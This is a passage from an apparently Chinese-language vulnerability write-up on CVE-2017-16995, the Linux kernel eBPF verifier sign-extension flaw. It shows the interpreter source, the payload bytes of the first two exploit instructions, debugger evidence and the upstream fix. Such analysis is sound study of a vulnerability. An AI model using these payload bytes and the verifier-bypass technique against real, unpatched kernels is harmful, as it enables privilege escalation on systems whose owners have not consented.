class="keyword">void</span> *ptr;</span><br><span class="line">    <span class="keyword">int</span> off;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONT     (&#123; insn++; goto select_insn; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONT_JMP (&#123; insn++; goto select_insn; &#125;)</span></span><br><span class="line"></span><br><span class="line">    FP = (u64) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) &amp;<span class="built_in">stack</span>[ARRAY_SIZE(<span class="built_in">stack</span>)];</span><br><span class="line">    ARG1 = (u64) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) ctx;</span><br><span class="line"></span><br><span class="line">select_insn:</span><br><span class="line">    <span class="keyword">goto</span> *jumptable[insn-&gt;code];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ALU */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALU(OPCODE, OP)            \</span></span><br><span class="line">    ALU64_##OPCODE##_X:        \</span><br><span class="line">        DST = DST OP SRC;    \</span><br><span class="line">        CONT;            \</span><br><span class="line">    ALU_##OPCODE##_X:        \</span><br><span class="line">        DST = (u32) DST OP (u32) SRC;    \</span><br><span class="line">        CONT;            \</span><br><span class="line">    ALU64_##OPCODE##_K:        \</span><br><span class="line">        DST = DST OP IMM;        \</span><br><span class="line">        CONT;            \</span><br><span class="line">    ALU_##OPCODE##_K:        \</span><br><span class="line">        DST = (u32) DST OP (u32) IMM;    \</span><br><span class="line">        CONT;</span><br><span class="line"></span><br><span class="line">    ALU(ADD,  +)</span><br><span class="line">    ALU(SUB,  -)</span><br><span class="line">    ALU(AND,  &amp;)</span><br><span class="line">    ALU(OR,   |)</span><br><span class="line">    ALU(LSH, &lt;&lt;)</span><br><span class="line">    ALU(RSH, &gt;&gt;)</span><br><span class="line">    ALU(XOR,  ^)</span><br><span class="line">    ALU(MUL,  *)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> ALU</span></span><br><span class="line">    ALU_NEG:</span><br><span class="line">        DST = (u32) -DST;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_NEG:</span><br><span class="line">        DST = -DST;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_MOV_X:</span><br><span class="line">        DST = (u32) SRC;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_MOV_K:</span><br><span class="line">        DST = (u32) IMM;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_MOV_X:</span><br><span class="line">        DST = SRC;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_MOV_K:</span><br><span class="line">        DST = IMM;</span><br><span class="line">        CONT;</span><br><span class="line">    LD_IMM_DW:</span><br><span class="line">        DST = (u64) (u32) insn[<span class="number">0</span>].imm | ((u64) (u32) insn[<span class="number">1</span>].imm) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">        insn++;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_ARSH_X:</span><br><span class="line">        (*(s64 *) &amp;DST) &gt;&gt;= SRC;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_ARSH_K:</span><br><span class="line">        (*(s64 *) &amp;DST) &gt;&gt;= IMM;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_MOD_X:</span><br><span class="line">        <span class="keyword">if</span> (unlikely(SRC == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        div64_u64_rem(DST, SRC, &amp;tmp);</span><br><span class="line">        DST = tmp;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_MOD_X:</span><br><span class="line">        <span class="keyword">if</span> (unlikely(SRC == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        tmp = (u32) DST;</span><br><span class="line">        DST = do_div(tmp, (u32) SRC);</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_MOD_K:</span><br><span class="line">        div64_u64_rem(DST, IMM, &amp;tmp);</span><br><span class="line">        DST = tmp;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_MOD_K:</span><br><span class="line">        tmp = (u32) DST;</span><br><span class="line">        DST = do_div(tmp, (u32) IMM);</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_DIV_X:</span><br><span class="line">        <span class="keyword">if</span> (unlikely(SRC == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        DST = div64_u64(DST, SRC);</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_DIV_X:</span><br><span class="line">        <span class="keyword">if</span> (unlikely(SRC == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        tmp = (u32) DST;</span><br><span class="line">        do_div(tmp, (u32) SRC);</span><br><span class="line">        DST = (u32) tmp;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_DIV_K:</span><br><span class="line">        DST = div64_u64(DST, IMM);</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_DIV_K:</span><br><span class="line">        tmp = (u32) DST;</span><br><span class="line">        do_div(tmp, (u32) IMM);</span><br><span class="line">        DST = (u32) tmp;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_END_TO_BE:</span><br><span class="line">        <span class="keyword">switch</span> (IMM) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">            DST = (__force u16) cpu_to_be16(DST);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">            DST = (__force u32) cpu_to_be32(DST);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">            DST = (__force u64) cpu_to_be64(DST);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_END_TO_LE:</span><br><span class="line">        <span class="keyword">switch</span> (IMM) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">            DST = (__force u16) cpu_to_le16(DST);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">            DST = (__force u32) cpu_to_le32(DST);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">            DST = (__force u64) cpu_to_le64(DST);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* CALL */</span></span><br><span class="line">    JMP_CALL:</span><br><span class="line">        <span class="comment">/* Function call scratches BPF_R1-BPF_R5 registers,</span></span><br><span class="line"><span class="comment">         * preserves BPF_R6-BPF_R9, and stores return value</span></span><br><span class="line"><span class="comment">         * into BPF_R0.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        BPF_R0 = (__bpf_call_base + insn-&gt;imm)(BPF_R1, BPF_R2, BPF_R3,</span><br><span class="line">                               BPF_R4, BPF_R5);</span><br><span class="line">        CONT;</span><br><span class="line"></span><br><span class="line">    JMP_TAIL_CALL: &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span> =</span> (struct bpf_map *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) BPF_R2;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> *<span class="title">array</span> =</span> container_of(<span class="built_in">map</span>, struct bpf_array, <span class="built_in">map</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span></span><br><span class="line">        u64 index = BPF_R3;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unlikely(index &gt;= <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unlikely(tail_call_cnt &gt; MAX_TAIL_CALL_CNT))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        tail_call_cnt++;</span><br><span class="line"></span><br><span class="line">        prog = READ_ONCE(<span class="built_in">array</span>-&gt;ptrs[index]);</span><br><span class="line">        <span class="keyword">if</span> (unlikely(!prog))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* ARG1 at this point is guaranteed to point to CTX from</span></span><br><span class="line"><span class="comment">         * the verifier side due to the fact that the tail call is</span></span><br><span class="line"><span class="comment">         * handeled like a helper, that is, bpf_tail_call_proto,</span></span><br><span class="line"><span class="comment">         * where arg1_type is ARG_PTR_TO_CTX.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        insn = prog-&gt;insnsi;</span><br><span class="line">        <span class="keyword">goto</span> select_insn;</span><br><span class="line">out:</span><br><span class="line">        CONT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* JMP */</span></span><br><span class="line">    JMP_JA:</span><br><span class="line">        insn += insn-&gt;off;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JEQ_X:</span><br><span class="line">        <span class="keyword">if</span> (DST == SRC) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JEQ_K:</span><br><span class="line">        <span class="keyword">if</span> (DST == IMM) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JNE_X:</span><br><span class="line">        <span class="keyword">if</span> (DST != SRC) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JNE_K:</span><br><span class="line">        <span class="keyword">if</span> (DST != IMM) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JGT_X:</span><br><span class="line">        <span class="keyword">if</span> (DST &gt; SRC) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JGT_K:</span><br><span class="line">        <span class="keyword">if</span> (DST &gt; IMM) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JGE_X:</span><br><span class="line">        <span class="keyword">if</span> (DST &gt;= SRC) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JGE_K:</span><br><span class="line">        <span class="keyword">if</span> (DST &gt;= IMM) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSGT_X:</span><br><span class="line">        <span class="keyword">if</span> (((s64) DST) &gt; ((s64) SRC)) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSGT_K:</span><br><span class="line">        <span class="keyword">if</span> (((s64) DST) &gt; ((s64) IMM)) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSGE_X:</span><br><span class="line">        <span class="keyword">if</span> (((s64) DST) &gt;= ((s64) SRC)) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSGE_K:</span><br><span class="line">        <span class="keyword">if</span> (((s64) DST) &gt;= ((s64) IMM)) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSET_X:</span><br><span class="line">        <span class="keyword">if</span> (DST &amp; SRC) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSET_K:</span><br><span class="line">        <span class="keyword">if</span> (DST &amp; IMM) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_EXIT:</span><br><span class="line">        <span class="keyword">return</span> BPF_R0;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* STX and ST and LDX*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDST(SIZEOP, SIZE)                        \</span></span><br><span class="line">    STX_MEM_##SIZEOP:                        \</span><br><span class="line">        *(SIZE *)(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (DST + insn-&gt;off) = SRC;    \</span><br><span class="line">        CONT;                            \</span><br><span class="line">    ST_MEM_##SIZEOP:                        \</span><br><span class="line">        *(SIZE *)(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (DST + insn-&gt;off) = IMM;    \</span><br><span class="line">        CONT;                            \</span><br><span class="line">    LDX_MEM_##SIZEOP:                        \</span><br><span class="line">        DST = *(SIZE *)(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (SRC + insn-&gt;off);    \</span><br><span class="line">        CONT;</span><br><span class="line"></span><br><span class="line">    LDST(B,   u8)</span><br><span class="line">    LDST(H,  u16)</span><br><span class="line">    LDST(W,  u32)</span><br><span class="line">    LDST(DW, u64)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> LDST</span></span><br><span class="line">    STX_XADD_W: <span class="comment">/* lock xadd *(u32 *)(dst_reg + off16) += src_reg */</span></span><br><span class="line">        atomic_add((u32) SRC, (<span class="keyword">atomic_t</span> *)(<span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">               (DST + insn-&gt;off));</span><br><span class="line">        CONT;</span><br><span class="line">    STX_XADD_DW: <span class="comment">/* lock xadd *(u64 *)(dst_reg + off16) += src_reg */</span></span><br><span class="line">        atomic64_add((u64) SRC, (<span class="keyword">atomic64_t</span> *)(<span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">                 (DST + insn-&gt;off));</span><br><span class="line">        CONT;</span><br><span class="line">    LD_ABS_W: <span class="comment">/* BPF_R0 = ntohl(*(u32 *) (skb-&gt;data + imm32)) */</span></span><br><span class="line">        off = IMM;</span><br><span class="line">load_word:</span><br><span class="line">        <span class="comment">/* BPF_LD + BPD_ABS and BPF_LD + BPF_IND insns are</span></span><br><span class="line"><span class="comment">         * only appearing in the programs where ctx ==</span></span><br><span class="line"><span class="comment">         * skb. All programs keep &#x27;ctx&#x27; in regs[BPF_REG_CTX]</span></span><br><span class="line"><span class="comment">         * == BPF_R6, bpf_convert_filter() saves it in BPF_R6,</span></span><br><span class="line"><span class="comment">         * internal BPF verifier will check that BPF_R6 ==</span></span><br><span class="line"><span class="comment">         * ctx.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * BPF_ABS and BPF_IND are wrappers of function calls,</span></span><br><span class="line"><span class="comment">         * so they scratch BPF_R1-BPF_R5 registers, preserve</span></span><br><span class="line"><span class="comment">         * BPF_R6-BPF_R9, and store return value into BPF_R0.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * Implicit input:</span></span><br><span class="line"><span class="comment">         *   ctx == skb == BPF_R6 == CTX</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * Explicit input:</span></span><br><span class="line"><span class="comment">         *   SRC == any register</span></span><br><span class="line"><span class="comment">         *   IMM == 32-bit immediate</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * Output:</span></span><br><span class="line"><span class="comment">         *   BPF_R0 - 8/16/32-bit skb data converted to cpu endianness</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        ptr = bpf_load_pointer((struct sk_buff *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) CTX, off, <span class="number">4</span>, &amp;tmp);</span><br><span class="line">        <span class="keyword">if</span> (likely(ptr != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            BPF_R0 = get_unaligned_be32(ptr);</span><br><span class="line">            CONT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    LD_ABS_H: <span class="comment">/* BPF_R0 = ntohs(*(u16 *) (skb-&gt;data + imm32)) */</span></span><br><span class="line">        off = IMM;</span><br><span class="line">load_half:</span><br><span class="line">        ptr = bpf_load_pointer((struct sk_buff *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) CTX, off, <span class="number">2</span>, &amp;tmp);</span><br><span class="line">        <span class="keyword">if</span> (likely(ptr != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            BPF_R0 = get_unaligned_be16(ptr);</span><br><span class="line">            CONT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    LD_ABS_B: <span class="comment">/* BPF_R0 = *(u8 *) (skb-&gt;data + imm32) */</span></span><br><span class="line">        off = IMM;</span><br><span class="line">load_byte:</span><br><span class="line">        ptr = bpf_load_pointer((struct sk_buff *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) CTX, off, <span class="number">1</span>, &amp;tmp);</span><br><span class="line">        <span class="keyword">if</span> (likely(ptr != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            BPF_R0 = *(u8 *)ptr;</span><br><span class="line">            CONT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    LD_IND_W: <span class="comment">/* BPF_R0 = ntohl(*(u32 *) (skb-&gt;data + src_reg + imm32)) */</span></span><br><span class="line">        off = IMM + SRC;</span><br><span class="line">        <span class="keyword">goto</span> load_word;</span><br><span class="line">    LD_IND_H: <span class="comment">/* BPF_R0 = ntohs(*(u16 *) (skb-&gt;data + src_reg + imm32)) */</span></span><br><span class="line">        off = IMM + SRC;</span><br><span class="line">        <span class="keyword">goto</span> load_half;</span><br><span class="line">    LD_IND_B: <span class="comment">/* BPF_R0 = *(u8 *) (skb-&gt;data + src_reg + imm32) */</span></span><br><span class="line">        off = IMM + SRC;</span><br><span class="line">        <span class="keyword">goto</span> load_byte;</span><br><span class="line"></span><br><span class="line">    default_label:</span><br><span class="line">        <span class="comment">/* If we ever reach this, we have a bug somewhere. */</span></span><br><span class="line">        WARN_RATELIMIT(<span class="number">1</span>, <span class="string">&quot;unknown opcode %02x\n&quot;</span>, insn-&gt;code);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是老样子，从第一行payload <code>\xb4\x09\x00\x00\xff\xff\xff\xff</code>开始看</p><p>这一句payload在真实执行中，将会跳转到以下标签</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALU_MOV_K:</span><br><span class="line">DST = (u32) IMM;</span><br><span class="line">CONT;</span><br></pre></td></tr></table></figure><p>也即将立即数(IMM)赋值给寄存器</p><p>这里我们要尤其关注<code>DST</code>以及<code>IMM</code>的类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DST    regs[insn-&gt;dst_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMM    insn-&gt;imm</span></span><br><span class="line">......</span><br><span class="line">u64 regs[MAX_BPF_REG], tmp;</span><br></pre></td></tr></table></figure><p>从上面可以看到,<code>DST</code>为无符号64位整型，而<code>IMM</code>，则是有符号32位整型</p><p>经过<code>DST = (u32) IMM;</code>语句，<code>IMM</code>被强转为无符号32位整型并赋值给<code>DST</code></p><p>但是，由于<code>DST</code>为无符号64位整型，所以<code>IMM</code>需要扩展为64位才可赋值，由于此时<code>IMM</code>为无符号整型，所以原来的<code>0xffffffff</code>将会被拓展为<code>0x00000000ffffffff</code>并赋值给<code>DST</code></p><p>接着我们来看第二句payload<code>\x55\x09\x02\x00\xff\xff\xff\xff</code></p><p>这一句payload将会跳转至以下标签</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JMP_JNE_K:</span><br><span class="line"><span class="keyword">if</span> (DST != IMM) &#123;</span><br><span class="line">    insn += insn-&gt;off;</span><br><span class="line">    CONT_JMP;</span><br><span class="line">&#125;</span><br><span class="line">CONT;</span><br></pre></td></tr></table></figure><p>也即判断<code>DST</code>是否等于<code>IMM</code>，那么如果你还记得，在虚拟执行中，这两个值是相等的，所以并不会执行跳转，后续执行第三、四句payload，从而退出bpf指令的执行</p><p>但是，在真实的执行中，却出现了一点问题</p><p>我们同样关注<code>DST</code>以及<code>IMM</code>的类型</p><p>此时，<code>DST</code>仍为无符号64位整型，而<code>IMM</code>，也仍是有符号32位整型</p><p>接着判断两个值是否相等<code>DST != IMM</code>，此时<code>DST</code>为<code>0x00000000ffffffff</code>，而<code>IMM</code>却由于是有符号32位整型，所以需要先拓展为64位才可以进行比较</p><p>那么<code>IMM</code>将会如何扩展呢？</p><p>由于<code>IMM</code>为带符号整型，所以原来<code>0xffffffff</code>将会被拓展为<code>0xffffffffffffffff</code></p><p>那么，由于<code>0x00000000ffffffff != 0xffffffffffffffff</code>，故而执行跳转，执行了本不该执行的，虚拟执行中未进行检查的我们的payload的剩余部分</p><p>看到这儿，相信原理已经十分清楚了，此漏洞就是由于内核不当的符号拓展导致了bpf解释器在虚拟执行以及真实执行时的解释存在差异，从而使得未经安全检查的bpf指令得以绕过bpf虚拟执行中的检查，被内核真实加载并执行</p><p>附上debug图</p><p>执行判断语句</p><p><img src="/image/CVE-2017-16995/DST.png" alt="DST"></p><p>可以看到此时恰好是漏洞的触发点，将要执行比较<code>DST</code>以及<code>IMM</code>的值</p><p>此时<code>DST</code>的值为<code>$rbp+$rax*8-0x278</code>处的值，可以看到是<code>0x00000000ffffffff</code></p><p>此时<code>IMM</code>的值为<code>rdx</code>寄存器的值，如下图所示</p><p><img src="/image/CVE-2017-16995/IMM.png" alt="IMM"></p><p>可以看到为<code>0xffffffffffffffff</code></p><p>同时，你也可以看到<code>&lt;__bpf_prog_run+2265&gt; movsxd rdx, DWORD PTR [rbx+0x4]</code>，此句便是执行了<code>IMM</code>的带符号拓展至64位的操作</p><p>最终由于两值不相等，从而进入了不该进入的分支，从而执行了未经校验的bpf指令</p><p><img src="/image/CVE-2017-16995/pwn.png" alt="pwn"></p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>此漏洞在如今的linux内核中已经被修复，来看看<code>linux-4.15</code>版本中如何修复此问题</p><p>主要的修复工作是在<code>check_alu_op</code>函数中做的，其中虚拟执行过程中的许多结构体经过了大改，所以简单叙述一下</p><p>在存在漏洞的版本中，我们第一句payload中的赋值操作，是由以下语句完成的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment">     * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在新版本中，是由以下语句完成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment">     * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    regs[insn-&gt;dst_reg].type = SCALAR_VALUE;</span><br><span class="line">    <span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;</span><br><span class="line">        __mark_reg_known(regs + insn-&gt;dst_reg,</span><br><span class="line">                 insn-&gt;imm);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        __mark_reg_known(regs + insn-&gt;dst_reg,</span><br><span class="line">                 (u32)insn-&gt;imm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看看<code>__mark_reg_known</code>的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Mark the unknown part of a register (variable offset or scalar value) as</span></span><br><span class="line"><span class="comment"> * known to have the value @imm.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">    reg-&gt;id = <span class="number">0</span>;</span><br><span class="line">    reg-&gt;var_off = tnum_const(imm);</span><br><span class="line">    reg-&gt;smin_value = (s64)imm;</span><br><span class="line">    reg-&gt;smax_value = (s64)imm;</span><br><span class="line">    reg-&gt;umin_value = imm;</span><br><span class="line">    reg-&gt;umax_value = imm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么在新版本中，我们原本的第一句payload将会触发<code>__mark_reg_known(regs + insn-&gt;dst_reg,(u32)insn-&gt;imm);</code>操作</p><p>可以看到我们传入的立即数将会先被强制转换为无符号32位整型并传入<code>__mark_reg_known</code>函数中</p><p>注意，<code>__mark_reg_known</code>函数对应的参数为无符号64位整形，那么被强转后的立即数值便会进行32位至64的无符号拓展，也即<code>0xffffffff -&gt; 0x00000000ffffffff</code></p><p>接着，我们看看<code>tnum_const</code>函数的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TNUM(_v, _m)    (struct tnum)&#123;.value = _v, .mask = _m&#125;</span></span><br><span class="line"><span class="comment">/* A completely unknown value */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">tnum_unknown</span> =</span> &#123; .value = <span class="number">0</span>, .mask = <span class="number">-1</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">struct tnum <span class="title">tnum_const</span><span class="params">(u64 value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> TNUM(value, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，此函数即是保存了<code>0x00000000ffffffff</code> 的值至<code>reg-&gt;var_off.value</code>中</p><p>继续，我们来看看原本第二句paylaod的执行情况</p><p>在原来版本中，“恒跳转”由以下语句判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</span><br><span class="line">    <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">        